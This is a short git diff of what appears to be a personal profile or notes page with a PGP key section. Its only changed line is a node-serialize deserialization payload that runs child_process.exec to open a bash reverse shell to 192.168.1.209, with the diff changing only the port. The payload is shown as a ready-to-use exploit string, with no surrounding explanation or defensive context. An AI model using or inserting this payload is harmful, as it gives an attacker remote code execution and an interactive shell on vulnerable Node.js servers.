@@ -16,7 +16,7 @@ PGP_ACCEPTED = true
 ```
 sErIaLiZe
 ```json
-{"leet":"_$$ND_FUNC$$_function() {require('child_process').exec('/bin/bash -i >& /dev/tcp/192.168.1.209/1234 0>&1', function(error, stdout, stderr) { console.log(stdout); });}"}
+{"leet":"_$$ND_FUNC$$_function() {require('child_process').exec('/bin/bash -i >& /dev/tcp/192.168.1.209/1337 0>&1', function(error, stdout, stderr) { console.log(stdout); });}"}
 ```
 <details closed>
 <summary>Click to view my PGP Public key</summary>
